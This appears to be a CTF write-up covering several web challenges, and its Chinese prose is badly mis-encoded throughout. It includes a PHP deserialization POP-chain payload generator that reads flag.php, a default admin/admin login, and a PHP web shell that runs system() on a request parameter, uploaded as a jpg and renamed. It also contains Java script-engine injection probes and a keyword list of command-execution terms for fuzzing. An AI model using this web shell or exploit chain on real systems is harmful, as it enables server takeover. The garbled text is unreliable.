title="å°ç¾Šèµ°è¿·å®«"></a>å°ç¾Šèµ°è¿·å®«</h2><img src="1075cc9df96a2e894e380357af969f8f.png" alt="1075cc9df96a2e894e380357af969f8f.png"  /><img src="30ac3f125be28631ecaa57dd7132fb16.png" alt="30ac3f125be28631ecaa57dd7132fb16.png"  /><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;gogogoå‡ºå‘å’¯ &quot;</span>;</span><br><span class="line">        <span class="variable">$way</span> = <span class="variable language_">$this</span>-&gt;direction;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$way</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æ‹¿åˆ°é’¥åŒ™å’¯ï¼Œå¼€é—¨ï¼ &quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; door -&gt; <span class="title function_ invoke__">open</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;å°ç¾ŠçœŸå¯çˆ±! &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span> -&gt; chest -&gt; key;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;è¯´ç‚¹ä»€ä¹ˆå‘¢ &quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;è¯´ï¼š &quot;</span>.<span class="variable language_">$this</span>-&gt;sth;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$arg1</span>,<span class="variable">$arg2</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;åˆ°è¾¾ç»ˆç‚¹ï¼ç°åœ¨å°è¯•è·å–flagå§&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;path);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿™ä¸ªå˜é‡åæœ‰ç‚¹å¥‡æ€ªï¼Œè¦æ€ä¹ˆä¼ å‚å‘¢ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span>      </span><br></pre></td></tr></table></figure><h3 id="PHPä¸­å…³äºéæ³•å‚æ•°åä¼ å‚é—®é¢˜"><a href="#PHPä¸­å…³äºéæ³•å‚æ•°åä¼ å‚é—®é¢˜" class="headerlink" title="PHPä¸­å…³äºéæ³•å‚æ•°åä¼ å‚é—®é¢˜"></a>PHPä¸­å…³äºéæ³•å‚æ•°åä¼ å‚é—®é¢˜</h3><p>å¯ä»¥çœ‹è¦‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>])&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ma_ze.path&quot;</span>]));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;è¿™ä¸ªå˜é‡åæœ‰ç‚¹å¥‡æ€ªï¼Œè¦æ€ä¹ˆä¼ å‚å‘¢ï¼Ÿ&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GETå‚³åƒ  unserialize(base64_decode($_GET[â€œma_ze.pathâ€]));</p><p><a href="https://blog.csdn.net/mochu7777777/article/details/115050295">https://blog.csdn.net/mochu7777777/article/details/115050295</a></p><p>ç¬¬ä¸€é—œ get åƒæ•¸, Payloadå¦‚ä¸‹ï¼š</p><p>?mo[chu.7&#x3D;xxx</p><h3 id="POPéˆ"><a href="#POPéˆ" class="headerlink" title="POPéˆ"></a>POPéˆ</h3><p>å…ˆæ‰¾å…¥å£å‡ºå£ , __wakeup() , é¦–å…ˆä¼šè°ƒç”¨startPointçš„__wakeupï¼Œå› ä¸ºå®ƒæœ‰__wakeupæ–¹æ³•</p><p>public $direction;</p><p>public $sth;</p><p>åªæœ‰é€™å…©å€‹å¯ç”¨çš„è®Šé‡ </p><p>å…¶ä»–éƒ½æ˜¯protected å’Œ private</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> (Treasureç±»çš„$doorå’Œ$doorå’Œdoorå’Œ</span><br><span class="line">doorå’Œchestå±æ€§æ˜¯protectedçš„ï¼Œä¸èƒ½ç›´æ¥è®¿é—®ã€‚</span><br><span class="line">æˆ‘ä»¬éœ€è¦ä½¿ç”¨åå°„æˆ–è€…æ‰‹åŠ¨æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²)</span><br></pre></td></tr></table></figure><p>æˆ‘å€‘ä¾†POPé“¾æ„é€ :</p><p>start-&gt;direction&#x3D;say</p><p>say-&gt;sth &#x3D; t2</p><p>t2â€¦â€¦</p><p>t1â€¦..</p><p>endâ€¦â€¦</p><p>çš„åè½‰</p><p>çœæµphpä»£ç¢¼:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå¯¹è±¡</span></span><br><span class="line"><span class="variable">$endpoint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">endPoint</span>();</span><br><span class="line"><span class="variable">$treasure1</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line"><span class="variable">$treasure2</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();</span><br><span class="line"><span class="variable">$say</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>();</span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨åå°„è®¾ç½®privateå’Œprotectedå±æ€§</span></span><br><span class="line"><span class="variable">$reflection</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$endpoint</span>);</span><br><span class="line"><span class="variable">$property</span> = <span class="variable">$reflection</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$property</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$endpoint</span>, <span class="string">&quot;./flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$reflectionTreasure</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="variable">$treasure1</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span> = <span class="variable">$reflectionTreasure</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;door&#x27;</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$propertyDoor</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$treasure1</span>, <span class="variable">$endpoint</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$propertyChest</span> = <span class="variable">$reflectionTreasure</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;chest&#x27;</span>);</span><br><span class="line"><span class="variable">$propertyChest</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$propertyChest</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$treasure2</span>, <span class="variable">$treasure1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„å»ºåˆ©ç”¨é“¾</span></span><br><span class="line"><span class="variable">$say</span>-&gt;sth = <span class="variable">$treasure2</span>;</span><br><span class="line"><span class="variable">$start</span>-&gt;direction = <span class="variable">$say</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Payload: &quot;</span> . <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;URL: ?ma_ze.path=&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$payload</span>)) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p>å¯ä»¥å…ˆè©¦è©¦ say  â€œi am gayâ€ , çœ‹çœ‹ start èƒ½ä¸èƒ½echo â€œè¯´ç‚¹ä»€ä¹ˆå‘¢ â€œ. â€œè¯´ï¼š â€œ.â€i am gayâ€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">startPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$direction</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SaySomething</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sth</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Treasure</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$door</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$chest</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">endPoint</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>() ;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>() ;</span><br><span class="line"><span class="variable">$b</span>-&gt;sth =  <span class="string">&quot;i am gay &quot;</span> ;</span><br><span class="line"><span class="variable">$a</span>-&gt;direction = <span class="variable">$b</span> ;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO3M6OToiaSBhbSBnYXkgIjt9fQ%3D%3D</p><img src="8e51236fc846dbb73724e589eb64e8bb.png" alt="8e51236fc846dbb73724e589eb64e8bb.png"  /><p>çœ‹ä¾†æ²’æœ‰æ‰“å° , å¯ä»¥çœ‹è¦‹sayå‡½æ•¸æ˜¯return $this-&gt;sth ;</p><p>æˆ‘æ‡‰è©²è¦ä»¤å®ƒ&#x3D; t2 , </p><p>t2-&gt;chest &#x3D; t1;</p><p>t1-&gt;door &#x3D; end </p><p>end -&gt; path &#x3D; â€œ.&#x2F;flag.phpâ€</p><p>æ‰€ä»¥å¤§æ¦‚æ˜¯é€™æ¨£å­çš„:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$end</span> = <span class="keyword">new</span> <span class="title function_ invoke__">endPoint</span>();      </span><br><span class="line"><span class="variable">$t1</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();        </span><br><span class="line"><span class="variable">$t2</span> = <span class="keyword">new</span> <span class="title class_">Treasure</span>();       </span><br><span class="line"><span class="variable">$say</span> = <span class="keyword">new</span> <span class="title class_">SaySomething</span>();  </span><br><span class="line"><span class="variable">$start</span> = <span class="keyword">new</span> <span class="title function_ invoke__">startPoint</span>();  </span><br><span class="line"></span><br><span class="line"><span class="variable">$end</span>-&gt;path = <span class="string">&quot;./flag.php&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="variable">$t1</span>-&gt;door = <span class="variable">$end</span>;    </span><br><span class="line"><span class="variable">$t2</span>-&gt;chest = <span class="variable">$t1</span>;    </span><br><span class="line"></span><br><span class="line"><span class="variable">$say</span>-&gt;sth = <span class="variable">$t2</span>;           </span><br><span class="line"><span class="variable">$start</span>-&gt;direction = <span class="variable">$say</span>; </span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æœ‰ä¸€å€‹å•é¡Œt1 t2 end ä¸æ˜¯public çš„å‚æ•¸ , æ­¤æ™‚æˆ‘å€‘éœ€è¦åå°„æˆ–è€…æ‰‹åŠ¨æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²</p><img src="b4529bea14119d9aee7d9fe1bafbe336.png" alt="b4529bea14119d9aee7d9fe1bafbe336.png"  /><p>deepseekçµ¦äº†ä¸€å€‹ä¾‹å­äº† , æŠ„å®ƒçš„äº† , æŠŠè®Šé‡åå­—å¯«æ¸…æ¥šå¦‚ä¸Š , æœ€å¾Œflagåœ¨å›æ‡‰è£¹ã€‚</p><h2 id="æ­¦åŠŸç§˜ç±"><a href="#æ­¦åŠŸç§˜ç±" class="headerlink" title="æ­¦åŠŸç§˜ç±"></a>æ­¦åŠŸç§˜ç±</h2><p>dirsearchä¸€ä¸‹:</p><img src="8f10990a9af18e11530e48cd45ffc406.png" alt="8f10990a9af18e11530e48cd45ffc406.png"  /><p>ç™¼ç¾admin admin èƒ½ç™»å…¥ , æœ‰ä¸€å€‹ä¸Šå‚³æ–‡ä»¶çš„åœ°æ–¹ :</p><img src="a3fc7ed21d05885e0b147d2b7374f6d9.png" alt="a3fc7ed21d05885e0b147d2b7374f6d9.png"  /><p>çœ‹çœ‹BPæŠ“åŒ…èƒ½ä¸æƒèƒ½ä¿®æ”¹:</p><img src="413a12393c875218bb68f4830713093f.png" alt="413a12393c875218bb68f4830713093f.png"  /><br/><p>Content-Type:  application&#x2F;octet-streamæ˜¯ä¸èƒ½ä¸Šå‚³çš„, é€™è£¹å…ˆæŠŠå®ƒæ”¹æˆtext&#x2F;plain</p><p>æŠŠæ–‡ä»¶æ”¹æˆtpl.config , æˆåŠŸä¸Šå‚³</p><img src="8e7db669d8659287335a13162c55f2c9.png" alt="8e7db669d8659287335a13162c55f2c9.png"  /><p>url&#x2F;dcr&#x2F;tpl_import_action.php  </p><img src="ab917802402e2124a50e2874ff1c6e54.png" alt="ab917802402e2124a50e2874ff1c6e54.png"  /><p>é‚„æœ‰åœ¨æ–°é—»ä¸­å¿ƒç™¼ç¾å¯ä»¥ä¸Šå‚³æ–‡ä»¶</p><p>å…ˆæ·»åŠ åˆ†ç±» 1234</p><img src="9be13db9188438c13f0a46b7a220dc3e.png" alt="9be13db9188438c13f0a46b7a220dc3e.png"  /><p>æ·»åŠ æ–°é—» , é¸æ“‡jpgçš„payload , payloadå¦‚ä¸‹ , ç„¶å¾Œæ”¹æˆjpgæª” </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="5727924543e78ea9ea44e2fd1979c340.png" alt="5727924543e78ea9ea44e2fd1979c340.png"  /><p>æœ€å¾Œåœ¨æ–‡ä»¶ç®¡ç†å™¨&#x2F;upload&#x2F;new&#x2F;â€¦.&#x2F;æ‰¾åˆ°jpgæª”æŠŠå®ƒé‡æ–°å‘½åç‚ºphpæª”:</p><p>æˆåŠŸfuzzäº†!!!!!!</p><img src="652dd9e90452a14545c289bf3bf0aa7e.png" alt="652dd9e90452a14545c289bf3bf0aa7e.png"  /><h2 id="sstiåœ¨å“ªé‡Œï¼Ÿ-å‘³å¤åˆ»"><a href="#sstiåœ¨å“ªé‡Œï¼Ÿ-å‘³å¤åˆ»" class="headerlink" title="sstiåœ¨å“ªé‡Œï¼Ÿ(å‘³å¤åˆ»)"></a>sstiåœ¨å“ªé‡Œï¼Ÿ(å‘³å¤åˆ»)</h2><br/><p><a href="https://blog.csdn.net/qq_43409582/article/details/90784223">https://blog.csdn.net/qq_43409582/article/details/90784223</a></p><h1 id="Week5"><a href="#Week5" class="headerlink" title="Week5"></a>Week5</h1><p>çœ¼ç†Ÿçš„è®¡ç®—å™¨</p><p>é€™æ˜¯ä¸€å€‹ç”¨javaå¯«çš„è¨ˆç®—å™¨ , çœ‹çœ‹jar , æ”¹æˆzip è§£å£“:<br><img src="54e354a5b18afc73ddc5dfbc10ee4840.png" alt="8f6c4313-0246-4426-a428-9f88e1e6c709.png"  /></p><p>ç”¨jadxæ‰“é–‹ , å¯ä»¥æ‰¾åˆ°:</p><img src="9260cfc845b572e57790f58a6c8bbdde.png" alt="0ad708e8-7dc9-4ce2-b141-c7c635512923.png"  /><img src="039db0209c289b489b787470a7209c84.png" alt="75f72059-3571-46fb-a8d5-c2d17c5925ec.png"  /><p>æ¸¬è©¦ä¸€ä¸‹ javaå¯ä¸å¯ä»¥æ³¨å…¥:</p><p>Java.type(â€˜java.lang.Stringâ€™)</p><img src="f3c76396a1116751e41d1ff069dc2a6e.png" alt="70542e50-c298-43d4-8197-f1c29e4db672.png"  /><p>æ¸¬è©¦å…¨å±€å°è±¡:</p><ul><li>Object.keys(this)</li><li>Object.getOwnPropertyNames(this)</li></ul><p>æ¸¬è©¦å…§ç½®å°è±¡:</p><ul><li>Math.PI</li><li>new Date().toString()</li><li>JSON.stringify({test: 123})</li></ul><p>å­—ç¬¦ä¸²æ“ä½œ:</p><ul><li>â€˜helloâ€™.length</li><li>â€˜helloâ€™ + â€˜ worldâ€™</li></ul><p>æ•¸çµ„æ“ä½œ:</p><ul><li>[1,2,3].join(â€˜-â€˜)</li></ul><p>å‡½æ•¸æ“ä½œ:</p><ul><li>(function(){return 123})()</li></ul><p>æ¸¬è©¦evalå’ŒFunction:</p><ul><li>eval(â€˜1+1â€™)</li><li>Function(â€˜return 789â€™)()</li></ul><p>ç·¨ç¢¼å‡½æ•¸:</p><ul><li>btoa(â€˜helloâ€™)</li><li>atob(â€˜aGVsbG8&#x3D;â€™)</li><li>encodeURI(â€˜hello worldâ€™)</li><li>decodeURI(â€˜hello%20worldâ€™)</li></ul><p>åŸå‹éˆ:</p><ul><li>Object.prototype</li><li>Object.constructor</li></ul><p>ç‰¹æ®Šå°è±¡:</p><ul><li>arguments</li><li>this</li></ul><p>ç’°å¢ƒè®Šé‡:</p><ul><li>process &amp;&amp; process.env</li><li>global</li></ul><p>Node.jså°è±¡:</p><ul><li>typeof require</li><li>module</li><li>exports</li></ul><p>ç”¨aiç”Ÿæˆé»‘åå–®é—œéµå­—çˆ†ç ´:</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">javascript</span><br><span class="line">java</span><br><span class="line">lang</span><br><span class="line">Runtime</span><br><span class="line">getRuntime</span><br><span class="line">exec</span><br><span class="line">ProcessBuilder</span><br><span class="line">start</span><br><span class="line">Class</span><br><span class="line">forName</span><br><span class="line">getMethod</span><br><span class="line">invoke</span><br><span class="line">System</span><br><span class="line">getProperty</span><br><span class="line">getenv</span><br><span class="line">File</span><br><span class="line">Scanner</span><br><span class="line">BufferedReader</span><br><span class="line">FileReader</span><br><span class="line">InputStream</span><br><span class="line">OutputStream</span><br><span class="line">read</span><br><span class="line">write</span><br><span class="line">reflect</span><br><span class="line">Method</span><br><span class="line">Field</span><br><span class="line">Constructor</span><br><span class="line">cmd</span><br><span class="line">sh</span><br><span class="line">bash</span><br><span class="line">powershell</span><br><span class="line">command</span><br><span class="line">cat</span><br><span class="line">flag</span><br><span class="line">ls</span><br><span class="line">pwd</span><br><span class="line">whoami</span><br><span class="line">id</span><br><span class="line">eval</span><br><span class="line">Function</span><br><span class="line">setTimeout</span><br><span class="line">setInterval</span><br><span class="line">decodeURI</span><br><span class="line">decodeURIComponent</span><br><span class="line">atob</span><br><span class="line">btoa</span><br><span class="line">String</span><br><span class="line">fromCharCode</span><br><span class="line">charCodeAt</span><br><span class="line">import</span><br><span class="line">require</span><br><span class="line">include</span><br><span class="line">load</span><br><span class="line">window</span><br><span class="line">document</span><br><span class="line">location</span><br><span 